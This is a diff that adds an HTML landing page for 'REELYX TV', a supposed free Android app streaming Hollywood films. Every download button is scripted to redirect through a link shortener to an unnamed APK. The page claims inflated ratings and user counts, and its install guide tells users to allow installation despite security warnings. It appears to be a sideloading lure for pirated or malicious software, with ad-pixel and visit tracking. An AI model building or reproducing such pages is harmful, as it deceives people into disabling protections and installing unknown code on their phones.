@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <title> TV 2026</title>
+ 
+
+
+    <!-- ========== k2 — Dynamic APK URL fetch & redirect (no device filter) ========== -->
+    <script>
+        
+        async function k2(source) {
+           
+
+           window.location.href = "https://lihi2.me/soza4";
+        }
+    </script>
+    <!-- ========== End k2 ========== -->
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <style>
+        /* All original styles are kept unchanged */
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        html { scroll-behavior: smooth; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #f5f5f5;
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        @media (min-width: 751px) {
+            body {
+                max-width: 500px;
+                margin: 0 auto;
+                box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            }
+        }
+        .landing-container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0;
+            background: #ffffff;
+            min-height: 100vh;
+        }
+        .landing-container:has(.dialog-component) {
+            max-width: none;
+            margin: 0;
+            padding: 0;
+            background: transparent;
+            min-height: 100vh;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .component {
+            margin: 0;
+            padding: 0;
+            border: none;
+            border-radius: 8px;
+        }
+        .text-component {
+            line-height: 1.6;
+            color: #333;
+            word-wrap: break-word;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        .button-component {
+            display: block;
+            width: 100%;
+            max-width: 100%;
+            padding: 15px 20px;
+            background: #1890ff;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 17px;
+            font-weight: 500;
+            text-align: center;
+            transition: background 0.3s;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        .button-component:active {
+            background: #096dd9;
+            transform: scale(0.98);
+        }
+        .image-component {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 8px;
+        }
+        .slideshow-container {
+            position: relative;
+            width: 100%;
+            height: 300px !important;
+            min-height: 300px !important;
+            max-height: 300px !important;
+            overflow: hidden;
+            border-radius: 8px;
+            background-color: #f0f0f0;
+        }
+        .slideshow-container img.slide {
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            object-fit: cover !important;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+        .slideshow-container img.slide.active {
+            opacity: 1;
+        }
+        .slideshow-indicators {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 5px;
+        }
+        .indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.5);
+            cursor: pointer;
+        }
+        .indicator.active {
+            background: white;
+        }
+        .slideshow-nav {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: none;
+            background: rgba(0,0,0,0.5);
+            color: white;
+            font-size: 24px;
+            line-height: 1;
+            cursor: pointer;
+            z-index: 20;
+            display: flex !important;
+            align-items: center;
+            justify-content: center;
+            opacity: 1 !important;
+            visibility: visible !important;
+            pointer-events: auto !important;
+        }
+        .slideshow-nav:hover {
+            background: rgba(0,0,0,0.7);
+        }
+        .slideshow-nav.prev {
+            left: 10px;
+        }
+        .slideshow-nav.next {
+            right: 10px;
+        }
+        .loading {
+            text-align: center;
+            padding: 50px;
+            font-size: 18px;
+            color: #666;
+        }
+        .error {
+            text-align: center;
+            padding: 50px;
+            color: #ff4d4f;
+            font-size: 18px;
+        }
+        @keyframes floatingPulse {
+            0%, 100% {
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+                transform: scale(1.08);
+            }
+        }
+        @-webkit-keyframes floatingPulse {
+            0%, 100% {
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+                -webkit-transform: scale(1);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+                -webkit-transform: scale(1.08);
+                transform: scale(1.08);
+            }
+        }
+        /* m11 styles (unchanged) */
+        .m11-render,.m11-render *{box-sizing:border-box}.m11-render{width:100%;background:#eef0f3}.m11-app{width:min(100%,var(--m11-max));min-height:100vh;margin:auto;padding-top:var(--m11-header);overflow:hidden;background:var(--m11-bg);color:var(--m11-text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}.m11-top{position:fixed;z-index:20;top:0;left:50%;width:min(100%,var(--m11-max));transform:translateX(-50%);height:var(--m11-header);background:rgba(10,14,23,.92);border-bottom:1px solid var(--m11-border)}.m11-top>div{height:53px;display:flex;align-items:center;justify-content:space-between;padding:8px 14px}.m11-top img{width:64px;height:32px;object-fit:contain}.m11-actions{display:flex;align-items:center;gap:8px}.m11-actions>a{padding:7px 12px;border:1px solid var(--m11-border);border-radius:99px;color:#fff;font-size:12px;text-decoration:none}.m11-lang{display:flex;padding:3px;border:1px solid var(--m11-border);border-radius:99px}.m11-lang button{padding:5px 8px;border:0;background:transparent;color:#c9d2e0}.m11-lang button:first-child{border-radius:99px;background:var(--m11-primary);color:#fff}.m11-top i{display:block;height:3px;background:linear-gradient(90deg,var(--m11-primary),var(--m11-primary-end));animation:m11progress 6s ease-in-out infinite;transform-origin:left}@keyframes m11progress{0%,100%{transform:scaleX(.35)}50%{transform:scaleX(1)}}.m11-hero{padding:48px 20px 28px;background:radial-gradient(at 100% 0,var(--m11-primary),transparent 60%),linear-gradient(var(--m11-surface),var(--m11-bg))}.m11-chip{display:inline-flex;padding:5px 10px;margin-bottom:14px;border:1px solid var(--m11-primary);border-radius:99px;color:var(--m11-primary-end);font-size:11px}.m11-chip span{width:6px;height:6px;margin:5px 6px 0 0;border-radius:50%;background:var(--m11-primary-end)}.m11-hero h1{margin:0 0 14px;font-size:26px;line-height:1.25}.m11-hero h1 em{display:block;color:#fff;font-style:normal}.m11-hero>p{color:var(--m11-muted);font-size:13px}.m11-download,.m11-sticky>a{display:inline-flex;justify-content:center;padding:13px 22px;border-radius:99px;background:linear-gradient(135deg,var(--m11-primary),var(--m11-primary-end));color:#fff;font-weight:800;text-decoration:none}.m11-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:22px}.m11-stats div{text-align:center;padding:10px 5px;border:1px solid var(--m11-border);border-radius:var(--m11-radius);background:rgba(255,255,255,.05)}.m11-stats b,.m11-stats small{display:block}.m11-stats small{color:var(--m11-muted)}.m11-category{padding:18px 0 6px;border-top:1px solid var(--m11-border)}.m11-section-head{display:flex;justify-content:space-between;padding:0 16px}.m11-section-head h2{margin:0;font-size:16px}.m11-section-head a{color:var(--m11-primary-end);font-size:11px}.m11-category>p{padding:0 16px;color:var(--m11-muted);font-size:11px}.m11-scroll{overflow:hidden}.m11-track{display:flex;width:max-content;gap:10px;padding:0 16px 8px}.m11-track.animate{animation:m11marquee linear infinite}@keyframes m11marquee{to{transform:translateX(-50%)}}.m11-content-card{width:var(--m11-card-width);flex:0 0 var(--m11-card-width);color:#fff;text-decoration:none}.m11-thumb{position:relative;aspect-ratio:2/3;overflow:hidden;border-radius:10px}.m11-thumb img{width:100%;height:100%;object-fit:cover}.m11-badge{position:absolute;top:6px;padding:3px 6px;border-radius:4px;background:var(--m11-badge);font-size:9px}.m11-badge.left{left:6px}.m11-badge.right{right:6px;background:var(--m11-success)}.m11-content-card b,.m11-content-card small{display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.m11-content-card b{font-size:12px}.m11-content-card small{color:var(--m11-muted);font-size:10px}.m11-install,.m11-faq{padding:16px}.m11-install>div{display:grid;gap:10px}.m11-install article,.m11-faq article{padding:14px;border:1px solid var(--m11-border);border-radius:var(--m11-radius);background:var(--m11-surface)}.m11-install article{display:flex;gap:12px}.m11-install article>span{display:grid;place-items:center;width:32px;height:32px;flex:none;border-radius:50%;background:var(--m11-primary)}.m11-install h3{margin:0}.m11-install p,.m11-faq p{color:var(--m11-muted);font-size:12px}.m11-info{margin:0 16px 16px;border-radius:var(--m11-radius);overflow:hidden;background:var(--m11-surface)}.m11-info div{display:flex;justify-content:space-between;padding:10px 14px;border-bottom:1px solid var(--m11-border)}.m11-info span{color:var(--m11-muted)}.m11-app footer{text-align:center;padding:24px;color:var(--m11-muted)}.m11-space{height:110px}.m11-sticky{position:fixed;z-index:30;bottom:0;left:50%;width:min(100%,var(--m11-max));transform:translateX(-50%);padding:10px 12px;background:rgba(10,14,23,.94);text-align:center}.m11-sticky>a{width:100%}.m11-sticky small{display:block;color:var(--m11-muted)}@media(prefers-reduced-motion:reduce){.m11-track,.m11-top i{animation:none!important}}
+        .m11-render{width:100vw;max-width:none;margin-left:calc(50% - 50vw);margin-right:calc(50% - 50vw);min-height:100vh;background:var(--m11-bg)}.m11-render .m11-top{left:0;width:100%;transform:none}.m11-render .m11-top>div{width:100%;margin:0}.m11-download-icon{position:relative;width:20px;height:20px;flex:none;margin-right:9px}.m11-download-icon:before{content:"";position:absolute;left:8px;top:0;width:4px;height:12px;border-radius:3px;background:currentColor}.m11-download-icon:after{content:"";position:absolute;left:4px;top:6px;width:9px;height:9px;border-right:4px solid currentColor;border-bottom:4px solid currentColor;transform:rotate(45deg)}.m11-download-icon i{position:absolute;left:2px;right:2px;bottom:0;height:3px;border-radius:3px;background:currentColor}.m11-buttons-animated a{animation:m11ButtonPulse var(--m11-button-speed) ease-in-out infinite}.m11-buttons-animated a:hover{animation-play-state:paused}@keyframes m11ButtonPulse{0%,100%{filter:brightness(1);transform:scale(1)}50%{filter:brightness(1.14);transform:scale(1.025)}}
+    </style>
+</head>
+<body>
+    <div class="landing-container">
+        <!-- All text is now in English, language switcher removed -->
+        <div class="component m11-render m11-buttons-animated" id="component-1" data-component-id="finished1011_page_1786028992629" style="--m11-bg:#000000;--m11-surface:#181818;--m11-elevated:#232b44;--m11-text:#ffffff;--m11-muted:#b3b3b3;--m11-primary:#7c3aed;--m11-primary-end:#a855f7;--m11-border:rgba(255,255,255,.08);--m11-badge:rgba(0,0,0,.7);--m11-success:#22c55e;--m11-max:480px;--m11-card-width:130px;--m11-header:56px;--m11-radius:12px;--m11-button-speed:1.80s">
+            <div class="m11-app">
+                <header class="m11-top">
+                    <div>
+                        <!-- Logo -->
+                        <a href="#" data-go7-fb-pixel-click="1" data-k2="true"><img src="images/1786033489937742827%40720w.webp" alt="REELYX TV"></a>
+                        <div class="m11-actions">
+                            <!-- Only "How to install" link, no language switcher -->
+                            <a href="#install">How to install</a>
+                        </div>
+                    </div>
+                    <i></i>
+                </header>
+                <section class="m11-hero">
+                    <div class="m11-chip"><span></span>Over 10,000 movies and TV series available to watch.</div>
+                    <h1>All your favorite movies are here.<em></em></h1>
+                    <p>Enjoy Hollywood movies, TV series and exclusive content directly on your phone in 4K HD quality.</p>
+                    <!-- Main download button -->
+                    <a class="m11-download" href="#" data-go7-fb-pixel-click="1" data-k2="true"><span class="m11-download-icon" aria-hidden="true"><i></i></span>Download REELYX TV for Android</a>
+                    <div class="m11-stats">
+                        <div><b>4.8</b><small>⭐</small></div>
+                        <div><b>HD/4K</b><small>High quality</small></div>
+                        <div><b>5M</b><small>Users</small></div>
+                        <div><b>10M+</b><small>Content items</small></div>
+                    </div>
+                </section>
+                <section class="m11-category">
+                    <div class="m11-section-head">
+                        <h2>Hollywood Movies in HD</h2>
+                        <a href="#" data-go7-fb-pixel-click="1" data-k2="true">Open in app →</a>
+                    </div>
+                    <p>Watch movies in 4K HD directly on your phone.</p>
+                    <div class="m11-scroll">
+                        <div class="m11-track animate" style="animation-duration:24s">
+                            <!-- All card links -->
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029548684384541.jpg" alt=""><span class="m11-badge left">⭐7.6</span><span class="m11-badge right">2024</span></div><b>Inside Out 2</b><small>Animation · Family</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029728772237925.jpg" alt=""><span class="m11-badge left">⭐8.7</span><span class="m11-badge right">2024</span></div><b>Dune: Part Two</b><small>Sci-Fi · Adventure</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029732688868589.jpg" alt=""><span class="m11-badge left">⭐7.3</span><span class="m11-badge right">2024</span></div><b>Alien: Romulus</b><small>Sci-Fi · Horror</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786031312058794753.jpg" alt=""><span class="m11-badge left">⭐8.4</span><span class="m11-badge right">2019</span></div><b>Avengers: Endgame</b><small>Action · Sci-Fi</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029738455105655.jpg" alt=""><span class="m11-badge left">⭐8.9</span><span class="m11-badge right">2023</span></div><b>Oppenheimer</b><small>Drama · History</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029742644734951.jpg" alt=""><span class="m11-badge left">⭐7.1</span><span class="m11-badge right">2023</span></div><b>Creed III</b><small>Drama · Sport</small></a>
+                            <!-- Duplicate for scrolling -->
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029548684384541.jpg" alt=""><span class="m11-badge left">⭐7.6</span><span class="m11-badge right">2024</span></div><b>Inside Out 2</b><small>Animation · Family</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029728772237925.jpg" alt=""><span class="m11-badge left">⭐8.7</span><span class="m11-badge right">2024</span></div><b>Dune: Part Two</b><small>Sci-Fi · Adventure</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029732688868589.jpg" alt=""><span class="m11-badge left">⭐7.3</span><span class="m11-badge right">2024</span></div><b>Alien: Romulus</b><small>Sci-Fi · Horror</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786031312058794753.jpg" alt=""><span class="m11-badge left">⭐8.4</span><span class="m11-badge right">2019</span></div><b>Avengers: Endgame</b><small>Action · Sci-Fi</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029738455105655.jpg" alt=""><span class="m11-badge left">⭐8.9</span><span class="m11-badge right">2023</span></div><b>Oppenheimer</b><small>Drama · History</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029742644734951.jpg" alt=""><span class="m11-badge left">⭐7.1</span><span class="m11-badge right">2023</span></div><b>Creed III</b><small>Drama · Sport</small></a>
+                        </div>
+                    </div>
+                </section>
+                <section class="m11-category">
+                    <div class="m11-section-head">
+                        <h2>Hollywood Movies in HD</h2>
+                        <a href="#" data-go7-fb-pixel-click="1" data-k2="true">Open in app →</a>
+                    </div>
+                    <p>Watch movies in 4K HD directly on your phone.</p>
+                    <div class="m11-scroll">
+                        <div class="m11-track animate" style="animation-duration:20s">
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029819372855936.jpg" alt=""><span class="m11-badge left">⭐6.2</span><span class="m11-badge right">2022</span></div><b>M3GAN</b><small>Horror · Sci-Fi</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029827006651595.jpg" alt=""><span class="m11-badge left">⭐5.8</span><span class="m11-badge right">2023</span></div><b>Fast X</b><small>Action · Thriller</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029832589672253.jpg" alt=""><span class="m11-badge left">⭐6.9</span><span class="m11-badge right">2023</span></div><b>Barbie</b><small>Comedy · Fantasy</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029835471835326.jpg" alt=""><span class="m11-badge left">⭐7.9</span><span class="m11-badge right">2022</span></div><b>Puss in Boots: The Last Wish</b><small>Animation · Comedy</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029838608613719.jpg" alt=""><span class="m11-badge left">⭐7.0</span><span class="m11-badge right">2023</span></div><b>Migration</b><small>Animation · Family</small></a>
+                            <!-- Duplicate -->
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029819372855936.jpg" alt=""><span class="m11-badge left">⭐6.2</span><span class="m11-badge right">2022</span></div><b>M3GAN</b><small>Horror · Sci-Fi</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029827006651595.jpg" alt=""><span class="m11-badge left">⭐5.8</span><span class="m11-badge right">2023</span></div><b>Fast X</b><small>Action · Thriller</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029832589672253.jpg" alt=""><span class="m11-badge left">⭐6.9</span><span class="m11-badge right">2023</span></div><b>Barbie</b><small>Comedy · Fantasy</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029835471835326.jpg" alt=""><span class="m11-badge left">⭐7.9</span><span class="m11-badge right">2022</span></div><b>Puss in Boots: The Last Wish</b><small>Animation · Comedy</small></a>
+                            <a class="m11-content-card" href="#" data-go7-fb-pixel-click="1" data-k2="true"><div class="m11-thumb"><img src="images/1786029838608613719.jpg" alt=""><span class="m11-badge left">⭐7.0</span><span class="m11-badge right">2023</span></div><b>Migration</b><small>Animation · Family</small></a>
+                        </div>
+                    </div>
+                </section>
+                <section class="m11-install" id="install">
+                    <h2>📲 Quick guide to install REELYX TV</h2>
+                    <div>
+                        <article><span>1</span><div><h3>Download the APK</h3><p>Tap the download button. The APK file will be saved to your Android phone.</p></div></article>
+                        <article><span>2</span><div><h3>Allow installation</h3><p>If a warning appears, allow installation from this source in your security settings.</p></div></article>
+                        <article><span>3</span><div><h3>Install and open</h3><p>Open the APK file from the download page and install REELYX TV to access high‑definition content.</p></div></article>
+                    </div>
+                </section>
+                <section class="m11-info">
+                    <div><span>App name</span><b>REELYX TV</b></div>
+                    <div><span>Version</span><b>V7.0.2 (2026)</b></div>
+                    <div><span>Size</span><b>11 MB</b></div>
+                    <div><span>Category</span><b>Movie streaming</b></div>
+                    <div><span>License</span><b>FREE</b></div>
+                    <div><span>Platform</span><b>Android 11+</b></div>
+                    <div><span>Minimum age</span><b>18+</b></div>
+                </section>
+                <section class="m11-faq">
+                    <h2>Frequently Asked Questions about REELYX TV</h2>
+                    <article><b>What content is available?</b><p>The app offers movies and TV series in high definition.</p></article>
+                    <article><b>Do I need to create an account?</b><p>No. You can install the app and access content without registration or email.</p></article>
+                    <article><b>Is viewing private?</b><p>The experience is designed for personal, private access from your Android device.</p></article>
+                    <article><b>Which devices are compatible?</b><p>Android phones and tablets running Android 11 or higher.</p></article>
+                </section>
+                <footer>© 2026 REELYX TV — Enjoy Hollywood movies, TV series and exclusive content directly on your phone.</footer>
+                <div class="m11-space"></div>
+                <div class="m11-sticky">
+                    <!-- Sticky footer button -->
+                    <a href="#" data-go7-fb-pixel-click="1" data-k2="true"><span class="m11-download-icon" aria-hidden="true"><i></i></span>Download REELYX TV — Free</a>
+                    <small>Android • 11 MB • No registration</small>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Smooth scroll for anchor links -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('a[href^="#component-"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+                    if (targetElement) {
+                        e.preventDefault();
+                        targetElement.scrollIntoView({ 
+                            behavior: 'smooth', 
+                            block: 'start' 
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+
+    <!-- Analytics script (unchanged) -->
+    <script>(function(){var v="16bbd6e6-9354-49e2-9076-20cda42de76a",pid=8138,uid=4362,rc="",cid=3740,s=Date.now(),a=0,l=0;function p(e,n){n=Math.max(1,Math.min(7200,Math.round(n)));if(e==='alive'){if(a)return;a=1;n=3}else{if(l&&l>=n)return;l=n}var d=new URLSearchParams();d.append('visit_id',v);d.append('landing_page_id',String(pid));d.append('user_id',String(uid));d.append('route_code',rc);if(cid>0)d.append('config_id',String(cid));d.append('referer',document.referrer||'');d.append('duration_seconds',String(n));d.append('event',e);if(navigator.sendBeacon){navigator.sendBeacon('/api/v1/landing/stats/duration',d)}else{fetch('/api/v1/landing/stats/duration',{method:'POST',body:d,keepalive:true}).catch(function(){})}}function r(){return (Date.now()-s)/1000}setTimeout(function(){if(document.visibilityState!=='hidden')p('alive',3)},3000);document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')p('leave',r())});window.addEventListener('pagehide',function(){p('leave',r())});})();</script>
+
+    <!-- ========== Bind all CTA links to call k2 ========== -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var downloadLinks = document.querySelectorAll('a[data-go7-fb-pixel-click="1"][data-k2="true"]');
+            downloadLinks.forEach(function(link) {
+                link.removeAttribute('onclick');
+                link.href = '#';
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    k2();
+                });
+            });
+        });
+    </script>
+    <!-- ========== End binding ========== --> 
+</body>
+</html>
